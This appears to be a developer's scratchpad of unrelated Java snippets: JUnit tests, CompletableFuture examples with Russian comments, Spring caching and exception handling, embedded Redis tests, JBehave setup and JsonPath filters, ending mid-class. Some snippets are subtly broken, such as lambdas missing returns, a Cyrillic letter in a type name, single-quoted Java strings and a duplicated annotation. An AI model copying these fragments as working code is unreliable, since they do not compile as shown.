    assertThrows(NullPointerException.class, () -> {
        test.length();
    });
}
@Test(expected = NullPointerException.class)
public void whenExceptionThrown_thenExpectationSatisfied() {
    String test = null;
    test.length();
}
@Rule
public ExpectedException exceptionRule = ExpectedException.none();
 
@Test
public void whenExceptionThrown_thenRuleIsApplied() {
    exceptionRule.expect(NumberFormatException.class);
    exceptionRule.expectMessage("For input string");
    Integer.parseInt("1a");
}
--------------------------------------------------------------------------------------------------------
"file.separator"	Character that separates components of a file path. This is “/” on UNIX and “\” on Windows.
"java.class.path"	Path used to find directories and JAR archives containing class files. Elements of the class path are separated by a platform-specific character specified in the path.separator property.
"java.home"	Installation directory for Java Runtime Environment (JRE)
"java.vendor"	JRE vendor name
"java.vendor.url"	JRE vendor URL
"java.version"	JRE version number
"line.separator"	Sequence used by operating system to separate lines in text files
"os.arch"	Operating system architecture
"os.name"	Operating system name
"os.version"	Operating system version
"path.separator"	Path separator character used in java.class.path
"user.dir"	User working directory
"user.home"	User home directory
"user.name"	User account name
--------------------------------------------------------------------------------------------------------
boolean allValid = Arrays.stream(DOT_PATTERN.split(packageName, -1)).allMatch(SourceVersion::isName);
--------------------------------------------------------------------------------------------------------
// Асинхронно запускаем задачу, заданную объектом Runnable
CompletableFuture<Void> future = CompletableFuture.runAsync(new Runnable() {
    @Override
    public void run() {
        // Имитация длительной работы
        try {
            TimeUnit.SECONDS.sleep(1);
        } catch (InterruptedException e) {
            throw new IllegalStateException(e);
        }
        System.out.println("Я буду работать в отдельном потоке, а не в главном.");
    }
});
 
// Блокировка и ожидание завершения Future
future.get();

// Запуск асинхронной задачи, заданной объектом Supplier
CompletableFuture<String> future = CompletableFuture.supplyAsync(new Supplier<String>() {
    @Override
    public String get() {
        try {
            TimeUnit.SECONDS.sleep(1);
        } catch (InterruptedException e) {
            throw new IllegalStateException(e);
        }
        return "Результат асинхронной задачи";
    }
});

CompletableFuture<User> getUsersDetail(String userId) {
    return CompletableFuture.supplyAsync(() -> {
        UserService.getUserDetails(userId);
    });
}
 
CompletableFuture<Double> getCreditRating(User user) {
    return CompletableFuture.supplyAsync(() -> {
        CreditRatingService.getCreditRating(user);
    });
}

CompletableFuture<CompletableFuture<Double>> result = getUserDetail(userId)
        .thenApply(user -> getCreditRating(user));

СompletableFuture<String> future = CompletableFuture.supplyAsync(() -> {
    try {
        TimeUnit.SECONDS.sleep(1);
    } catch (InterruptedException e) {
        throw new IllegalStateException(e);
    }
    return "Результат асинхронной задачи";
}, executor);

System.out.println("Получение веса.");
CompletableFuture<Double> weightInKgFuture = CompletableFuture.supplyAsync(() -> {
    try {
        TimeUnit.SECONDS.sleep(1);
    } catch (InterruptedException e) {
       throw new IllegalStateException(e);
    }
    return 65.0;
});
 
System.out.println("Получение роста.");
CompletableFuture<Double> heightInCmFuture = CompletableFuture.supplyAsync(() -> {
    try {
        TimeUnit.SECONDS.sleep(1);
    } catch (InterruptedException e) {
       throw new IllegalStateException(e);
    }
    return 177.8;
});
 
System.out.println("Расчёт индекса массы тела.");
CompletableFuture<Double> combinedFuture = weightInKgFuture
        .thenCombine(heightInCmFuture, (weightInKg, heightInCm) -> {
    Double heightInMeter = heightInCm / 100;
    return weightInKg/(heightInMeter * heightInMeter);
});
 
System.out.println("Ваш индекс массы тела - " + combinedFuture.get());

// Когда все задачи завершены, вызываем future.join(), чтобы получить результаты и собрать их в список
CompletableFuture<List<String>> allPageContentsFuture = allFutures.thenApply(v -> {
   return pageContentFutures.stream()
           .map(pageContentFuture -> pageContentFuture.join())
           .collect(Collectors.toList());
});

CompletableFuture<String> future1 = CompletableFuture.supplyAsync(() -> {
    try {
        TimeUnit.SECONDS.sleep(2);
    } catch (InterruptedException e) {
       throw new IllegalStateException(e);
    }
    return "Результат Future 1";
});
 
CompletableFuture<String> future2 = CompletableFuture.supplyAsync(() -> {
    try {
        TimeUnit.SECONDS.sleep(1);
    } catch (InterruptedException e) {
       throw new IllegalStateException(e);
    }
    return "Результат Future 2";
});
 
CompletableFuture<String> future3 = CompletableFuture.supplyAsync(() -> {
    try {
        TimeUnit.SECONDS.sleep(3);
    } catch (InterruptedException e) {
       throw new IllegalStateException(e);
    }
    return "Результат Future 3";
});
 
CompletableFuture<Object> anyOfFuture = CompletableFuture.anyOf(future1, future2, future3);
 
System.out.println(anyOfFuture.get()); // Результат Future 2


CompletableFuture<String> maturityFuture = CompletableFuture.supplyAsync(() -> {
    if (age < 0) {
        throw new IllegalArgumentException("Возраст не может быть отрицательным");
    }
    if (age > 18) {
        return "Взрослый";
    } else {
        return "Ребёнок";
    }
}).exceptionally(ex -> {
    System.out.println("Ой! У нас тут исключение - " + ex.getMessage());
    return "Неизвестно!";
});


Integer age = -1;
 
CompletableFuture<String> maturityFuture = CompletableFuture.supplyAsync(() -> {
    if (age < 0) {
        throw new IllegalArgumentException("Возраст не может быть отрицательным");
    }
    if (age > 18) {
        return "Взрослый";
    } else {
        return "Ребёнок";
    }
}).handle((res, ex) -> {
    if (ex != null) {
        System.out.println("Ой! У нас тут исключение - " + ex.getMessage());
        return "Неизвестно!";
    }
    return res;
});
 
System.out.println("Зрелость: " + maturityFuture.get());
--------------------------------------------------------------------------------------------------------
things.stream().filter(filtersCollection.stream().<Predicate>map(f -> f::test)
                       .reduce(Predicate::or).orElse(t->false));
--------------------------------------------------------------------------------------------------------
@RestControllerAdvice
public class GlobalResponseEntityExceptionHandler extends ResponseEntityExceptionHandler {

    @Override
    protected ResponseEntity<Object> handleMissingServletRequestParameter(MissingServletRequestParameterException ex, HttpHeaders headers, HttpStatus status, WebRequest request) {
        return errorResponse(HttpStatus.BAD_REQUEST, "Required request params missing");
    }

    private ResponseEntity<Object> errorResponse(HttpStatus status, String message) {
        return ResponseEntity.status(status).body(message);
    }
}
--------------------------------------------------------------------------------------------------------
@Override
protected ResponseEntity<Object> handleExceptionInternal(Exception ex, Object body,
                             HttpHeaders headers, HttpStatus status, WebRequest request) {
    if (body == null) {
        body = ImmutableMap.builder()
                   .put("timestamp", LocalDateTime.now().atZone(ZoneId.systemDefault()).toEpochSecond())
                   .put("status", status.value())
                   .put("error", status.getReasonPhrase())
                   .put("message", ex.getMessage())
                   .put("exception", ex.getClass().getSimpleName())  // can show FQCN like spring with getName()
                   .put("path", ((ServletWebRequest)request).getRequest().getRequestURI())
                   .build();
    }
    return super.handleExceptionInternal(ex, body, headers, status, request);
}
--------------------------------------------------------------------------------------------------------
public interface DomainOperations<T> {
  default List<T> filter(Predicate<T> predicate) {
    return persons.stream().filter( predicate )
      .collect(Collectors.<Person>toList());
 }
}
--------------------------------------------------------------------------------------------------------
public static void main(String[] args) {
Optional<Employee> maxSalaryEmp=employeeList.stream()
    .reduce((Employee a, Employee b) -> a.getSalary() < b.getSalary() ? b:a);
if(maxSalaryEmp.isPresent())
  System.out.println("Employee with max salary: "+maxSalaryEmp.get());
}
--------------------------------------------------------------------------------------------------------
public class CacheManager {
    public static final List<CacheManager> ALL_CACHE_MANAGERS = new CopyOnWriteArrayList<CacheManager>();
....
}
--------------------------------------------------------------------------------------------------------
@CacheConfig(cacheNames="book", keyGenerator="myKeyGenerator") 
public class BookRepository {

    @Cacheable
    public Book findBook(ISBN isbn) {...}

    public Book thisIsNotCached(String someArg) {...}
}
--------------------------------------------------------------------------------------------------------
public class CacheUtil {
  public static CacheManager myCacheManager;

  public CacheManager getMyCacheManager() {
    if(myCacheManager == null) {
    for (CacheManager cacheManager : CacheManager.ALL_CACHE_MANAGERS) {
       if("myCacheManager".equals(cacheManager.getName())) {
          myCacheManager = cacheManager;
       }
    }
    return myCacheManager;
  }
}
--------------------------------------------------------------------------------------------------------
var cacheManager = require('cache-manager');
var fsStore = require('cache-manager-fs');
var diskCache = cacheManager.caching({
    store: fsStore, options: {
      ttl: 60*60,
      maxsize: 1000*1000*1000,
      path: 'diskcache',
      preventfill: true
    }
  });

var ttl = 30;

function getUser(id, cb) {
    setTimeout(function () {
        console.log("Returning user from slow database.");
        cb(null, {id: id, name: 'Bob'});
    }, 5000);
}

var userId = 123;
var key = 'user_' + userId;

// Note: ttl is optional in wrap()
memoryCache.wrap(key, function (cb) {
    getUser(userId, cb);
}, {ttl: ttl}, function (err, user) {
    console.log(user);

    // Second time fetches user from memoryCache
    memoryCache.wrap(key, function (cb) {
        getUser(userId, cb);
    }, function (err, user) {
        console.log(user);
    });
});
--------------------------------------------------------------------------------------------------------
@Bean
public CacheManager cacheManager() {
	SimpleCacheManager cacheManager = new SimpleCacheManager();
	cacheManager.setCaches( Collections.singletonList( new ConcurrentMapCache( “userCache” ) ) );

	// manually call initialize the caches as our SimpleCacheManager is not declared as a bean
	cacheManager.initializeCaches(); 

	return new TransactionAwareCacheManagerProxy( cacheManager );
}
--------------------------------------------------------------------------------------------------------
Cache transactionAwareUserCache( CacheManager cacheManager ) {
	return new TransactionAwareCacheDecorator( cacheManager.getCache( “userCache” ) );
}
--------------------------------------------------------------------------------------------------------
@Bean
public CacheManager cacheManager( net.sf.ehcache.CacheManager ehCacheCacheManager ) {
	EhCacheCacheManager cacheManager = new EhCacheCacheManager();
	cacheManager.setCacheManager( ehCacheCacheManager );
	cacheManager.setTransactionAware( true );
	return cacheManager;
}
--------------------------------------------------------------------------------------------------------
class UserService {
	@Cacheable(value = "userCache", unless = "#result != null")
	public User getUserById( long id ) {
   		return userRepository.getById( id );
	}
}
 
class UserRepository {
	@Caching(
      put = {
            @CachePut(value = "userCache", key = "'username:' + #result.username", condition = "#result != null"),
            @CachePut(value = "userCache", key = "#result.id", condition = "#result != null")
      }
	)
	@Transactional(readOnly = true)
	public User getById( long id ) {
	   ...
	}
}
--------------------------------------------------------------------------------------------------------
import org.springframework.core.io.Resource;
import org.springframework.core.io.ResourceLoader;
import org.springframework.core.io.support.PathMatchingResourcePatternResolver;

import java.io.IOException;
import java.util.Arrays;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SingleAppResourcePatternResolver extends PathMatchingResourcePatternResolver {

    public static final Pattern JAR_NAME_PATTERN = Pattern.compile(".*/(.+?\\.jar).*");

    private Set<String> dependencyJars;

    public SingleAppResourcePatternResolver(ResourceLoader resourceLoader, Set<String> dependencyJars) {
        super(resourceLoader);
        this.dependencyJars = dependencyJars;
    }

    @Override
    public Resource[] getResources(String locationPattern) throws IOException {
        Resource[] resources = super.getResources(locationPattern);
        return Arrays.stream(resources)
                .filter(this::foundInDependencies)
                .toArray(Resource[]::new);
    }

    private boolean foundInDependencies(Resource resource) {
        try {
            String url = resource.getURL().toString();
            if (url.contains("META-INF/resources/webjars/")) {
                // WebJAR resources could be loaded from shared dependencies
                return true;
            }

            Matcher matcher = JAR_NAME_PATTERN.matcher(url);
            if (matcher.find()) {
                String jarName = matcher.group(1);
                return dependencyJars.contains(jarName);
            }
            return true;
        } catch (IOException e) {
            throw new RuntimeException("An error occurred while looking for resources", e);
        }
    }
}
--------------------------------------------------------------------------------------------------------
import javax.annotation.Nullable;
import java.util.*;

/**
 * Describes an app component which the current application depends on.
 */
public class AppComponent implements Comparable<AppComponent> {

    private final String id;
    private final List<AppComponent> dependencies = new ArrayList<>();
    private Properties properties;
    private Set<String> additiveProperties;

    public AppComponent(String id) {
        this.id = id;
    }

    /**
     * @return app component Id
     */
    public String getId() {
        return id;
    }

    /**
     * @return descriptor path by convention
     */
    public String getDescriptorPath() {
        return id.replace('.', '/') + "/app-component.xml";
    }

    /**
     * INTERNAL.
     * Add a dependency to the component.
     */
    public void addDependency(AppComponent other) {
        if (dependencies.contains(other))
            return;
        if (other.dependsOn(this))
            throw new RuntimeException("Circular dependency between app components '" + this + "' and '" + other + "'");

        dependencies.add(other);
    }

    /**
     * Check if this component depends on the given component.
     */
    public boolean dependsOn(AppComponent other) {
        for (AppComponent dependency : dependencies) {
            if (dependency.equals(other) || dependency.dependsOn(other))
                return true;
        }
        return false;
    }

    /**
     * INTERNAL.
     * Set a file-based app property defined in this app component.
     */
    public void setProperty(String name, String value, boolean additive) {
        if (properties == null)
            properties = new Properties();

        if (additive) {
            if (additiveProperties == null) {
                additiveProperties = new HashSet<>();
            }
            additiveProperties.add(name);
        } else if (additiveProperties != null) {
            additiveProperties.remove(name);
        }

        properties.setProperty(name, value);
    }

    /**
     * @return a file-based app property defined in this app component or null if not found
     */
    @Nullable
    public String getProperty(String property) {
        return properties == null ? null : properties.getProperty(property);
    }

    public boolean isAdditiveProperty(String property) {
        return additiveProperties != null && additiveProperties.contains(property);
    }

    /**
     * @return names of properties exported by this app component, sorted in natural order
     */
    public List<String> getPropertyNames() {
        if (properties == null) {
            return Collections.emptyList();
        }
        List<String> list = new ArrayList<>(properties.stringPropertyNames());
        list.sort(Comparator.naturalOrder());
        return list;
    }

    @Override
    public int compareTo(AppComponent other) {
        if (this.dependsOn(other))
            return 1;
        if (other.dependsOn(this)) {
            return -1;
        }
        return 0;
    }

    @Override
    public boolean equals(Object o) {
        if (this == o) return true;
        if (o == null || getClass() != o.getClass()) return false;

        AppComponent that = (AppComponent) o;

        return id.equals(that.id);

    }

    @Override
    public int hashCode() {
        return id.hashCode();
    }

    @Override
    public String toString() {
        return id;
    }
}
--------------------------------------------------------------------------------------------------------
import com.haulmont.cuba.core.global.MessageTools;
import com.haulmont.cuba.core.global.Messages;
import org.hibernate.validator.internal.engine.messageinterpolation.InterpolationTerm;
import org.hibernate.validator.internal.engine.messageinterpolation.InterpolationTermType;
import org.hibernate.validator.internal.engine.messageinterpolation.parser.Token;
import org.hibernate.validator.internal.engine.messageinterpolation.parser.TokenCollector;
import org.hibernate.validator.internal.engine.messageinterpolation.parser.TokenIterator;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import javax.el.ExpressionFactory;
import javax.validation.MessageInterpolator;
import javax.validation.ValidationException;
import java.util.List;
import java.util.Locale;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class CubaValidationMessagesInterpolator implements MessageInterpolator {
    protected static final String DEFAULT_CONSTRAINTS_MESSAGE_PACK = "com.haulmont.cuba.core.global.validation";

    private final Logger log = LoggerFactory.getLogger(CubaValidationMessagesInterpolator.class);

    protected Messages messages;
    protected ExpressionFactory expressionFactory;
    protected Locale locale;

    protected static final Pattern LEFT_BRACE = Pattern.compile("\\{", Pattern.LITERAL);
    protected static final Pattern RIGHT_BRACE = Pattern.compile("\\}", Pattern.LITERAL);
    protected static final Pattern SLASH = Pattern.compile("\\\\", Pattern.LITERAL);
    protected static final Pattern DOLLAR = Pattern.compile("\\$", Pattern.LITERAL);

    public CubaValidationMessagesInterpolator(Messages messages, Locale locale) {
        this.messages = messages;
        this.locale = locale;
        this.expressionFactory = ExpressionFactory.newInstance();
    }

    @Override
    public String interpolate(String messageTemplate, Context context) {
        Locale defaultLocale = locale;
        return interpolate(messageTemplate, context, defaultLocale);
    }

    @Override
    public String interpolate(String messageTemplate, Context context, Locale locale) {
        String interpolatedMessage = messageTemplate;
        try {
            interpolatedMessage = interpolateMessage(messageTemplate, context, locale);
        } catch (ValidationException e) {
            log.error("Unable to interpolate validation message: {}", e.getMessage());
        }
        return interpolatedMessage;
    }

    protected String interpolateMessage(String messageTemplate, Context context, Locale locale) {
        String resolvedMessage = interpolateMessage(messageTemplate, locale);

        TokenCollector tokenCollector = new TokenCollector(resolvedMessage, InterpolationTermType.PARAMETER);
        List<Token> tokens = tokenCollector.getTokenList();

        resolvedMessage = interpolateExpression(new TokenIterator(tokens), context, locale);

        tokenCollector = new TokenCollector(resolvedMessage, InterpolationTermType.EL);
        tokens = tokenCollector.getTokenList();

        resolvedMessage = interpolateExpression(new TokenIterator(tokens), context, locale);

        resolvedMessage = replaceEscapedLiterals(resolvedMessage);

        return resolvedMessage;
    }

    protected String interpolateExpression(TokenIterator tokenIterator, Context context, Locale locale) {
        while (tokenIterator.hasMoreInterpolationTerms()) {
            String term = tokenIterator.nextInterpolationTerm();

            InterpolationTerm expression = new InterpolationTerm(term, locale, expressionFactory);
            String resolvedExpression = expression.interpolate(context);
            tokenIterator.replaceCurrentInterpolationTerm(resolvedExpression);
        }
        return tokenIterator.getInterpolatedMessage();
    }

    protected String replaceEscapedLiterals(String resolvedMessage) {
        resolvedMessage = LEFT_BRACE.matcher(resolvedMessage).replaceAll("{");
        resolvedMessage = RIGHT_BRACE.matcher(resolvedMessage).replaceAll("}");
        resolvedMessage = SLASH.matcher(resolvedMessage).replaceAll(Matcher.quoteReplacement("\\"));
        resolvedMessage = DOLLAR.matcher(resolvedMessage).replaceAll(Matcher.quoteReplacement("$"));
        return resolvedMessage;
    }

    protected String interpolateMessage(String message, Locale locale) {
        TokenCollector tokenCollector = new TokenCollector(message, InterpolationTermType.PARAMETER);
        TokenIterator tokenIterator = new TokenIterator(tokenCollector.getTokenList());
        while (tokenIterator.hasMoreInterpolationTerms()) {
            String term = tokenIterator.nextInterpolationTerm();
            String resolvedParameterValue = resolveParameter(term, locale);
            tokenIterator.replaceCurrentInterpolationTerm(resolvedParameterValue);
        }
        return tokenIterator.getInterpolatedMessage();
    }

    protected String resolveParameter(String parameterName, Locale locale) {
        String parameterValue;
        String messageCode = removeCurlyBraces(parameterName);
        try {
            if (messageCode.startsWith("javax.validation.constraints")
                    || messageCode.startsWith("org.hibernate.validator.constraints")) {
                parameterValue = messages.getMessage(DEFAULT_CONSTRAINTS_MESSAGE_PACK, messageCode, locale);
                // try to find tokens recursive
                parameterValue = interpolateMessage(parameterValue, locale);
            } else if (messageCode.startsWith(MessageTools.MARK) || messageCode.startsWith(MessageTools.MAIN_MARK)) {
                parameterValue = messages.getTools().loadString(messageCode, locale);
                // try to find tokens recursive
                parameterValue = interpolateMessage(parameterValue, locale);
            } else {
                parameterValue = parameterName;
            }
        } catch (UnsupportedOperationException e) {
            // return parameter itself
            parameterValue = parameterName;
        }
        return parameterValue;
    }

    protected String removeCurlyBraces(String parameter) {
        return parameter.substring(1, parameter.length() - 1);
    }
}
--------------------------------------------------------------------------------------------------------
@Test
//Note the try/finally is to ensure that the server is shutdown so other tests do not have to
//provide auth information
public void testAuth() throws Exception {
 
  RedisServer server = RedisServer.builder().port(6381).setting("requirepass foobar").build();
  server.start();
  RedisOptions job = new RedisOptions()
    .setHost("localhost")
    .setPort(6381);
  RedisClient rdx = RedisClient.create(vertx, job);
 
  rdx.auth("barfoo", reply -> {
    assertFalse(reply.succeeded());
    rdx.auth("foobar", reply2 -> {
      assertTrue(reply2.succeeded());
      try {
        server.stop();
      } catch (Exception ignore) {
      }
      testComplete();
    });
  });
  await();
}
--------------------------------------------------------------------------------------------------------
@Test
public void testDebugSegfault() throws Exception {
 
  RedisServer server = RedisServer.builder().port(6381).build();
  server.start();
  RedisOptions job = new RedisOptions()
    .setHost("localhost")
    .setPort(6381);
  RedisClient rdx = RedisClient.create(vertx, job);
 
  rdx.debugSegfault(reply -> {
    // this should fail, since we crashed the server on purpose
    assertTrue(reply.failed());
    rdx.info(reply2 -> {
      assertFalse(reply2.succeeded());
      server.stop();
      testComplete();
    });
  });
  await();
}

public RedisServerResource(int port, String password) {
    this.port = port;
    try {
        RedisExecProvider redisExecProvider = RedisExecProvider.defaultProvider();
        this.redisServer = RedisServer
                .builder()
                .redisExecProvider(redisExecProvider)
                .port(port)
                .setting("requirepass " + password)
                .build();
    } catch (Throwable error) {
        String message = String.format("failed creating Redis server (port=%d)", port);
        throw new RuntimeException(message, error);
    }
}

@Before
public void before() throws Exception {
  mockTracer.reset();
 
  redisServer = RedisServer.builder().setting("bind 127.0.0.1").build();
  redisServer.start();
} 

private void startServer(TestContext testContext) {
    EmbeddedRedis embeddedRedis = AnnotationUtils.findAnnotation(testContext.getTestClass(), EmbeddedRedis.class);
    int port = embeddedRedis.port();
 
    try {
        server = new RedisServer(port);
        server.start();
    } catch (IOException e) {
        if (logger.isErrorEnabled()) {
            logger.error(e.getMessage(), e);
        }
    }
}

private RedisServer createRedisServer() {
    final RedisServerBuilder redisServerBuilder = RedisServer.builder()
            .port(redisPort)
            .setting("appendonly yes")
            .setting("appendfsync everysec");
    settings.stream().forEach(s -> redisServerBuilder.setting(s));
 
    final RedisServer redisServer = redisServerBuilder.build();
    return redisServer;
}
--------------------------------------------------------------------------------------------------------
sudo lsof -i:8983
--------------------------------------------------------------------------------------------------------
@Bean
	public RedisConnectionFactory redisConnectionFactory() {
		RedisStandaloneConfiguration configuration = new RedisStandaloneConfiguration("127.0.0.1", 6379);
		LettuceConnectionFactory lettuceConnectionFactory = new LettuceConnectionFactory(configuration);
		return lettuceConnectionFactory;
	}

@Bean
	public RedisTemplate<String, Bean> redisTemplate(RedisConnectionFactory connectionFactory) {
		RedisTemplate<String, Bean> redisTemplate = new RedisTemplate<>();
		redisTemplate.setConnectionFactory(connectionFactory);
		return redisTemplate;
	}

@Bean
	public Subscription listener(TestStreamListener streamListener, RedisConnectionFactory redisConnectionFactory)
			throws InterruptedException {
		StreamMessageListenerContainerOptions<String, ObjectRecord<String, String>> containerOptions = StreamMessageListenerContainerOptions
				.builder().serializer(RedisSerializer.string()).errorHandler(e -> e.printStackTrace())
				.keySerializer(RedisSerializer.string()).targetType(String.class).build();

		StreamMessageListenerContainer<String, ObjectRecord<String, String>> container = StreamMessageListenerContainer
				.create(redisConnectionFactory, containerOptions);

		Subscription subscription = container.receive(Consumer.from("group-1", "consumer-1"),
				StreamOffset.fromStart("streamx"), a -> {
					System.out.println(a.getValue());
				});
		container.start();
		while (!subscription.isActive())
			;
		System.out.println("The subscriber is active: "+subscription.isActive());
		return subscription;
	}
--------------------------------------------------------------------------------------------------------
value = "${edison.application.management.base-path:/internal}/toggles",
--------------------------------------------------------------------------------------------------------
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.DisplayNameGeneration;
import org.junit.jupiter.api.DisplayNameGenerator;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

class DisplayNameGeneratorDemo {

    @Nested
    @DisplayNameGeneration(DisplayNameGenerator.ReplaceUnderscores.class)
    class A_year_is_not_supported {

        @Test
        void if_it_is_zero() {
        }

        @DisplayName("A negative value for year is not supported by the leap year computation.")
        @ParameterizedTest(name = "For example, year {0} is not supported.")
        @ValueSource(ints = { -1, -4 })
        void if_it_is_negative(int year) {
        }

    }

    @Nested
    @DisplayNameGeneration(IndicativeSentences.class)
    class A_year_is_a_leap_year {

        @Test
        void if_it_is_divisible_by_4_but_not_by_100() {
        }

        @ParameterizedTest(name = "Year {0} is a leap year.")
        @ValueSource(ints = { 2016, 2020, 2048 })
        void if_it_is_one_of_the_following_years(int year) {
        }

    }

    static class IndicativeSentences extends DisplayNameGenerator.ReplaceUnderscores {

        @Override
        public String generateDisplayNameForClass(Class<?> testClass) {
            return super.generateDisplayNameForClass(testClass);
        }

        @Override
        public String generateDisplayNameForNestedClass(Class<?> nestedClass) {
            return super.generateDisplayNameForNestedClass(nestedClass) + "...";
        }

        @Override
        public String generateDisplayNameForMethod(Class<?> testClass, Method testMethod) {
            String name = testClass.getSimpleName() + ' ' + testMethod.getName();
            return name.replace('_', ' ') + '.';
        }
    }
}


https://github.com/reeda/spring-boot-jbehave/tree/master/src


@ContextConfiguration(classes = AcceptanceTestsConfiguration.class)
@ImportResource({"classpath:/application.properties", "classpath:/tests.properties"})
@ActiveProfiles("tests")
@DirtiesContext
@Target(ElementType.TYPE)
@Retention(RetentionPolicy.RUNTIME)
public @interface AcceptanceTest {
}

<400 BAD_REQUEST Bad Request,BaseExceptionHandler.DefaultExceptionResponse(path=, status=400, error=Bad Request, message=Validation failed for argument [0] in public org.springframework.http.ResponseEntity com.paragon.microservices.confirmationlink.callback.controller.impl.TicketControllerImpl.checkAndSendToDataBus(com.paragon.microservices.confirmationlink.callback.model.dto.TicketRequest) with 2 errors: [Field error in object 'ticketRequest' on field 'subject': rejected value [null]; codes [NotBlank.ticketRequest.subject,NotBlank.subject,NotBlank.java.lang.String,NotBlank]; arguments [org.springframework.context.support.DefaultMessageSourceResolvable: codes [ticketRequest.subject,subject]; arguments []; default message [subject]]; default message [Ticket request <subject> property should not be blank]] [Field error in object 'ticketRequest' on field 'requestSource': rejected value [null]; codes [NotNull.ticketRequest.requestSource,NotNull.requestSource,NotNull.com.paragon.microservices.confirmationlink.callback.model.enumeration.RequestSourceType,NotNull]; arguments [org.springframework.context.support.DefaultMessageSourceResolvable: codes [ticketRequest.requestSource,requestSource]; arguments []; default message [requestSource]]; default message [Ticket request <request-source> property should not be null]] , timestamp=Wed Dec 11 17:16:11 MSK 2019),[]>
--------------------------------------------------------------------------------------------------------
@SpringBootApplication
public class App 
{
    public static void main(String[] args) 
    {
        ApplicationContext ctx = SpringApplication.run(App.class, args);
         
        String[] beanNames = ctx.getBeanDefinitionNames();
         
        Arrays.sort(beanNames);
 
        for (String beanName : beanNames) {
            System.out.println(beanName);
        }
    }
}
--------------------------------------------------------------------------------------------------------
@RunWith(AnnotatedEmbedderRunner.class)
@UsingEmbedder(embedder = Embedder.class, generateViewAfterStories = true,
    ignoreFailureInStories = true, ignoreFailureInView = false, 
    verboseFailures = true)
@UsingSteps(instances = { NgisRestSteps.class })
public class StoriesTest extends JUnitStories {
 
  @Override
  protected List<String> storyPaths() {
    return new StoryFinder().findPaths(
        CodeLocations.codeLocationFromClass(getClass()).getFile(),
        Arrays.asList(getStoryFilter(storyPaths)), null);
  }
 
  private String getStoryFilter(String storyPaths) {
    if (storyPaths == null) {
      return '*.story';
    }
    if (storyPaths.endsWith('.story')) {
      return storyPaths;
    }
    return storyPaths + '.story';
  }
 
  private List<String> specifiedStoryPaths(String storyPaths) {
    List<String> result = new ArrayList<String>();
    URI cwd = new File('src/test/resources').toURI();
    for (String storyPath : storyPaths.split(File.pathSeparator)) {
      File storyFile = new File(storyPath);
      if (!storyFile.exists()) {
        throw new IllegalArgumentException('Story file not found: '
          + storyPath);
      }
      result.add(cwd.relativize(storyFile.toURI()).toString());
    }
    return result;
  }
 
  @Override
  public Configuration configuration() {
    return super.configuration()
        .useStoryReporterBuilder(new StoryReporterBuilder()
            .withFormats(Format.XML, Format.STATS, Format.CONSOLE)
            .withRelativeDirectory('../build/jbehave')
        )
        .usePendingStepStrategy(new FailingUponPendingStep())
        .useFailureStrategy(new SilentlyAbsorbingFailure());
  }
}
--------------------------------------------------------------------------------------------------------
/**
 * Enum representing the step types
 */
public enum StepType {

	/** 
	 * Represents a precondition to an event
	 */
	GIVEN, 
	
	/**
	 * Represents an event
	 */
	WHEN, 
	
	/**
	 * Represents an outcome of an event
	 */
	THEN,
	
    /**
     * Represents repetition of previous step
     */
	AND,
	
	/**
	 * Represents an ignorable step 
	 */
	IGNORABLE
}
--------------------------------------------------------------------------------------------------------
 <dependency>
            <groupId>net.thucydides</groupId>
            <artifactId>thucydides-jbehave-plugin</artifactId>
            <version>0.9.275</version>
        </dependency>
--------------------------------------------------------------------------------------------------------
        //return value -> EqualsBuilder.reflectionEquals(value, ticketMessage, "requestId");
--------------------------------------------------------------------------------------------------------
Filter<?> filter = Filter.filter(Criteria.where("hey").regex(Pattern.compile(".*find.*")));
System.out.println(JsonPath.read(json, "$..[?]", filter));
--------------------------------------------------------------------------------------------------------
Object dataObject = JsonPath.parse(jsonString).read("$[?(@.id == 2)]");
String dataString = dataObject.toString();

DocumentContext context = JsonPath.parse(jsonString);
List<Map<String, Object>> dataList = context.read("$[?(@.director == 'Sam Mendes')]");
--------------------------------------------------------------------------------------------------------
@ParameterizedTest(name = "{index} {1}")
@MethodSource("argumentProvider")
public void testSomething(Object someObject, String niceRepresentation) {
    // Test something
}

private static Stream<Arguments> argumentProvider() {
    return Stream.of(
            Arguments.of(new Object(), "Nice 1"),
            Arguments.of(new Object(), "Nice 2")
    );
}

  
   @ParameterizedTest(name = "Null Check Test  #{index} with [{arguments}]")
   @ParameterizedTest
   @ValueSource(strings = { "Hello", "World" })
   void withSomeValues(String word) {
	System.out.println(word);
	assertNotNull(word);
}

   @ParameterizedTest
    @ValueSource(strings ={"niraj,sonawane"})
    void withCustomConverter(@ConvertWith(PersonConverter.class) Person person) {
		assertEquals(Person.getFirstName(),"niraj");
		assertEquals(Person.getLastName(),"sonawane");
	} 
    //Convert class 
    public class PersonConverter implements ArgumentConverter {
	@Override
	public Object convert(Object source, ParameterContext context) throws ArgumentConversionException {
		if (source instanceof String)
			try {
				String[] split = ((String) source).split(",");
				return new Emp(split[0], split[1]);

			} catch (NumberFormatException ex) {
				String message = source + " is no correct string representation of a Emp.";
				throw new ArgumentConversionException(message, ex);
			}
		throw new ArgumentConversionException(source + " is no valid point");
	}
}
--------------------------------------------------------------------------------------------------------
package com.paragon.microservices.mailer.model.domain;

import com.fasterxml.jackson.annotation.*;
import com.paragon.mailingcontour.commons.system.constraint.annotation.NullOrNotEmpty;
import lombok.AllArgsConstructor;
import lombok.Builder;
import lombok.Data;
import lombok.NoArgsConstructor;
import lombok.experimental.UtilityClass;
import org.springframework.validation.annotation.Validated;

import javax.validation.Valid;
import javax.validation.constraints.Email;
import javax.validation.constraints.NotBlank;
import javax.validation.constraints.NotNull;
import java.util.List;

import static com.paragon.microservices.mailer.model.domain.MailMessage.Info.*;

@Data
@Builder
@Validated
@NoArgsConstructor
@AllArgsConstructor
@JsonIgnoreProperties(ignoreUnknown = true)
@JsonInclude(JsonInclude.Include.NON_EMPTY)
@JsonRootName(value = MODEL_DTO_NAME, namespace = "mailer")
public class MailMessage {
    /**
     * Email address of sender.
     */
    @JsonProperty(FROM_FIELD_NAME)
    @Email(message = "{model.domain.mail-message.from.invalidEmail}")
    @NotBlank(message = "{model.domain.mail-message.from.notBlank}")
    private String from;

    /**
     * Email address of the person to receive record.
     */
    @JsonProperty(TO_FIELD_NAME)
